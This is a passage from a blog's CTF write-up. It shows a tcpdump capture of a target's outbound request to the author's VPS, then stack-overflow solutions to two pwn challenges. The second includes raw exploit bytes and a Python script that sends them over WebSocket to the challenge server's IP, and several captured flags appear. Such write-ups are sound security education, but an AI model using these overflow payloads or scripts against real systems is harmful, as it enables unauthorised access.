<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tcpdump -i any -s 0 -A -nn &#x27;tcp port 80 and (((ip[2:2] - ((ip[0]&amp;0xf)&lt;&lt;2) - ((tcp[12]&amp;0xf0)&gt;&gt;2)) &gt; 0))&#x27;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>-A</code>: print payload as ASCII</li>
<li>BPF expression selects TCP packets on port 80 that contain application payload (so you see the request lines and headers, not just ACKs)</li>
</ul>
<ol start="6">
<li>With tcpdump running, the target server issued an outbound request to my VPS URL; I saw the full raw HTTP request including headers printed to the terminal.</li>
</ol>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251010002914187.png" alt="image-20251010002914187"></p>
<p>Flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;soM3ST@RS_are_blu_n_red&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><p>Pwn has two Stack Overflow challenges</p>
<h3 id="Authentication-Override-Easy"><a href="#Authentication-Override-Easy" class="headerlink" title="Authentication Override: Easy"></a>Authentication Override: Easy</h3><p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251010003315371.png" alt="image-20251010003315371"></p>
<p>This is a stack buffer overflow: scanf(“%s”, password) can overwrite the next stack variable admin so you can make admin &#x3D;&#x3D; 0x41424344 and trigger displayFlag().</p>
<p>So, payload:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;A*10&quot; + &quot;DCBA&quot;</span><br></pre></td></tr></table></figure>

<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20250930144916392.png" alt="image-20250930144916392"></p>
<p>Flag:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NexusCTF&#123;b@ffer_0verfl0w_m4st3r&#125;</span><br></pre></td></tr></table></figure>

<h3 id="Authentication-Override-Intermediate"><a href="#Authentication-Override-Intermediate" class="headerlink" title="Authentication Override: Intermediate"></a>Authentication Override: Intermediate</h3><p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251010004209592.png" alt="image-20251010004209592"></p>
<p>I inspected the program and saw it reads scanf(“%s”, password) into char password[10] and then checks if (admin &#x3D;&#x3D; 0x11223344) displayFlag();. Because scanf doesn’t limit input length, I can overflow password and overwrite the adjacent int admin to make the check succeed.</p>
<p>The service communicates over WebSocket. From captures I observed the real client behavior:</p>
<ul>
<li>The client prefixes sent frames with the ASCII ‘0’ (0x30).</li>
<li>Input is echoed per character; the final carriage return CR (0x0d) signals end of user input.</li>
<li>The target runs on little-endian x86&#x2F;Ubuntu, so 0x11223344 is laid out in memory as bytes 44 33 22 11 (low→high).</li>
</ul>
<p><img src="https://mac-pic-1314279731.cos.ap-nanjing.myqcloud.com/image-20251010004521692.png" alt="image-20251010004521692"></p>
<p>I discovered 0x11 (DC1) is treated as a control byte by some layer and is not preserved if I send it directly. To avoid that, I inserted 0x16 (SYN) immediately before 0x11; empirically 0x16 prevents 0x11 from being interpreted and allows it to arrive as data.</p>
<p>Including the client prefix ‘0’, the raw bytes I send are:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">30 61 61 61 61 61 61 61 61 61 61 44 33 22 16 11 0d</span><br></pre></td></tr></table></figure>

<p>This small Python script connects to the challenge WebSocket (ws:&#x2F;&#x2F;34.129.100.231:5057&#x2F;ws) using the observed tty subprotocol, sends the same initial JSON the real client sends to start the terminal session, waits for the “Enter password” prompt, then sends the crafted binary payload (hex 3066…1110d) as a binary WebSocket frame. It then prints any server replies (hex and decoded text). In short: mimic the client handshake → wait for prompt → send raw binary exploit bytes → read the response for the flag.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">password_hex = <span class="string">&quot;306666666666666666666644332216110d&quot;</span></span><br><span class="line">ws_url = <span class="string">&quot;ws://34.129.100.231:5057/ws&quot;</span></span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(ws_url, subprotocols=[<span class="string">&quot;tty&quot;</span>])</span><br><span class="line">ws.send(json.dumps(&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;start&quot;</span>,<span class="string">&quot;cols&quot;</span>:<span class="number">80</span>,<span class="string">&quot;rows&quot;</span>:<span class="number">24</span>&#125;))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    msg = ws.recv()</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Enter&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(msg):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">ws.send(<span class="built_in">bytes</span>.fromhex(password_hex), opcode=websocket.ABNF.OPCODE_BINARY)</span><br><span class="line">response = ws.recv()</span><br><span class="line"><span class="built_in">print</span>(response)</span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://yosheep.github.io">YoSheep</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://yosheep.github.io/posts/6d596838.html">https://yosheep.github.io/posts/6d596838.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://yosheep.github.io" target="_blank">YoSheep's 学习笔记</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post_share"><div class="social-share" data-image="/img/yeah_circle.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/4da32f64.html" title="Gap Year Review --- 在路上的一年"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Gap Year Review --- 在路上的一年</div></div></a></div></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/yeah_circle.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">YoSheep</div><div class="author-info__description">欢迎各位师傅交流学习</br>vx: sunny下划线yosheep</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">20</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/YoSheep"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yosheep" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:sunny_cxw@outlook.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">佬说：“搞安全的，技术不重要，重要的是要会想。”</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#NexusCTF-Write-Up-By-YoSheep"><span class="toc-number">1.</span> <span class="toc-text">NexusCTF Write-Up By YoSheep</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Miscellaneous"><span class="toc-number">1.1.</span> <span class="toc-text">Miscellaneous</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Annoying-No"><span class="toc-number">1.1.1.</span> <span class="toc-text">Annoying? No.</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Static-Analysis"><span class="toc-number">1.1.2.</span> <span class="toc-text">Static Analysis</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#The-Tower-of-Babel"><span class="toc-number">1.1.3.</span> <span class="toc-text">The Tower of Babel</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Space-and-Time"><span class="toc-number">1.1.4.</span> <span class="toc-text">Space and Time</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#A-Star-Trail"><span class="toc-number">1.1.5.</span> <span class="toc-text">A Star Trail</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Web-Exploitation"><span class="toc-number">1.2.</span> <span class="toc-text">Web Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Conditional-Constellation"><span class="toc-number">1.2.1.</span> <span class="toc-text">Conditional Constellation</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDPC-Intergalactic-Login-Portal"><span class="toc-number">1.2.2.</span> <span class="toc-text">UDPC Intergalactic Login Portal</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#It%E2%80%99s-All-Coming-Together%E2%80%A6"><span class="toc-number">1.2.3.</span> <span class="toc-text">It’s All Coming Together…</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Some-Stars-Read-Fast"><span class="toc-number">1.2.4.</span> <span class="toc-text">Some Stars Read Fast</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.3.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication-Override-Easy"><span class="toc-number">1.3.1.</span> <span class="toc-text">Authentication Override: Easy</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Authentication-Override-Intermediate"><span class="toc-number">1.3.2.</span> <span class="toc-text">Authentication Override: Intermediate</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/6d596838.html" title="NexusCTF Write-Up By YoSheep">NexusCTF Write-Up By YoSheep</a><time datetime="2025-10-09T13:52:25.000Z" title="发表于 2025-10-10 00:52:25">2025-10-10</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/4da32f64.html" title="Gap Year Review --- 在路上的一年">Gap Year Review --- 在路上的一年</a><time datetime="2025-09-21T14:18:05.000Z" title="发表于 2025-09-22 00:18:05">2025-09-22</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b97f01f6.html" title="Java安全篇(3)-CC链">Java安全篇(3)-CC链</a><time datetime="2025-08-29T06:26:28.000Z" title="发表于 2025-08-29 16:26:28">2025-08-29</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/105b1196.html" title="XML 外部实体注入（XXE）漏洞基本原理">XML 外部实体注入（XXE）漏洞基本原理</a><time datetime="2025-08-24T11:40:38.000Z" title="发表于 2025-08-24 21:40:38">2025-08-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/b1433c19.html" title="Java安全篇(2)-ysoserial使用">Java安全篇(2)-ysoserial使用</a><time datetime="2025-08-23T13:56:54.000Z" title="发表于 2025-08-23 23:56:54">2025-08-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2023 - 2025 By YoSheep</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'iSjR5V9ZIytpvfNU137OlQGH-gzGzoHsz',
      appKey: '9jj4DuX9kTm6wiDHKR1Llu7T',
      avatar: 'monsterid',
      serverURLs: 'https://isjr5v9z.lc-cn-n1-shared.com',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.jsdelivr.net/npm/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>